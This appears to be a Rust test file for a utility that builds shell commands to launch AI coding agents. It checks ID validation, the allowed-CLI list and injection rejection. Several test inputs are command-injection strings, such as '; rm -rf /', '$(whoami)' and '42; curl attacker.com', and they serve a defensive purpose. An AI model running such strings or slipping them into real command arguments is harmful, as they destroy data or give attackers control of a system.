// Tests for sse_delegate_util: safe ID validation, command building, injection prevention.

use super::*;

#[test]
fn safe_id_valid_and_invalid() {
    assert!(is_safe_id("T1-02"));
    assert!(is_safe_id("671"));
    assert!(is_safe_id("plan_706"));
    assert!(!is_safe_id(""));
    for bad in &[
        "; rm -rf /",
        "$(whoami)",
        "`id`",
        "foo && bar",
        "foo | bar",
        "foo > /tmp/x",
        "foo\nbar",
        "foo'bar",
        "foo\"bar",
        "foo bar",
    ] {
        assert!(!is_safe_id(bad), "expected rejection of: {bad}");
    }
}

#[test]
fn valid_cli_claude_builds_command() {
    let cmd = build_agent_command("claude", "671", &HashMap::new()).unwrap();
    // Settings file is generated; claude runs WITHOUT --dangerously-skip-permissions
    assert!(cmd.contains("claude --input-file"));
    assert!(!cmd.contains("--dangerously-skip-permissions"));
    assert!(cmd.contains("Execute plan 671"));
    assert!(cmd.contains("cvg task update"), "must include cvg workflow");
    assert!(cmd.contains("cvg plan validate"), "must include validation step");

    let mut qs = HashMap::new();
    qs.insert("task_id".into(), "T1-02".into());
    qs.insert("wave_id".into(), "W1".into());
    let cmd = build_agent_command("claude", "671", &qs).unwrap();
    assert!(cmd.contains("task T1-02 wave W1"));
}

#[test]
fn valid_cli_copilot_builds_command() {
    let mut qs = HashMap::new();
    qs.insert("task_id".into(), "99".into());
    let cmd = build_agent_command("copilot", "42", &qs).unwrap();
    assert!(cmd.contains("copilot") && !cmd.contains("--dangerously-skip-permissions"));
}

#[test]
fn invalid_cli_and_injection_rejected() {
    let msg = build_agent_command("my-agent", "42", &HashMap::new())
        .unwrap_err()
        .to_string();
    assert!(msg.contains("not in the allowed list"), "got: {msg}");
    assert!(build_agent_command("claude; rm -rf /", "42", &HashMap::new()).is_err());
}

#[test]
fn plan_id_injection_rejected() {
    let msg = build_agent_command("claude", "42; curl attacker.com", &HashMap::new())
        .unwrap_err()
        .to_string();
    assert!(msg.contains("plan_id"), "got: {msg}");
    assert!(build_agent_command("claude", "`whoami`", &HashMap::new()).is_err());
}

#[test]
fn task_wave_id_injection_rejected() {
    let mut qs = HashMap::new();
    qs.insert("task_id".into(), "T1-02 && evil".into());
    let msg = build_agent_command("claude", "671", &qs)
        .unwrap_err()
        .to_string();
    assert!(msg.contains("task_id"), "got: {msg}");

    let mut qs2 = HashMap::new();
    qs2.insert("wave_id".into(), "W1$(id)".into());
    let msg2 = build_agent_command("claude", "671", &qs2)
        .unwrap_err()
        .to_string();
    assert!(msg2.contains("wave_id"), "got: {msg2}");
}

#[test]
fn command_uses_hardcoded_binary() {
    let cmd = build_agent_command("claude", "1", &HashMap::new()).unwrap();
    // claude invoked directly — settings.json provides permissions, not --dangerously flag
    assert!(cmd.contains("claude --input-file"));
    assert!(!cmd.contains("--dangerously-skip-permissions"));
}

#[test]
fn claude_uses_input_file_not_inline_prompt() {
    let cmd = build_agent_command("claude", "671", &HashMap::new()).unwrap();
    assert!(
        cmd.contains("--input-file"),
        "expected --input-file in command, got: {cmd}"
    );
    assert!(
        !cmd.contains("claude -p "),
        "must not use inline -p flag, got: {cmd}"
    );
}

#[test]
fn copilot_uses_input_file_not_inline_prompt() {
    let cmd = build_agent_command("copilot", "42", &HashMap::new()).unwrap();
    assert!(
        cmd.contains("--input-file"),
        "expected --input-file in command, got: {cmd}"
    );
}

#[test]
fn prompt_file_written_before_agent_invocation() {
    let cmd = build_agent_command("claude", "671", &HashMap::new()).unwrap();
    let write_pos = cmd.find("printf").or_else(|| cmd.find("cat >")).or_else(|| cmd.find("tee"));
    let agent_pos = cmd.find("claude --input-file");
    assert!(write_pos.is_some(), "command must write prompt to file, got: {cmd}");
    assert!(write_pos.unwrap() < agent_pos.unwrap(), "prompt write must precede agent invocation");
}

#[test]
fn prompt_file_path_uses_plan_id() {
    let cmd = build_agent_command("claude", "671", &HashMap::new()).unwrap();
    assert!(cmd.contains("671"), "prompt file path should include plan_id for traceability");
}

#[test]
fn prompt_includes_cvg_complete() {
    let cmd = build_agent_command("claude", "742", &HashMap::new()).unwrap();
    assert!(cmd.contains("cvg plan complete"), "must include plan completion instruction");
}
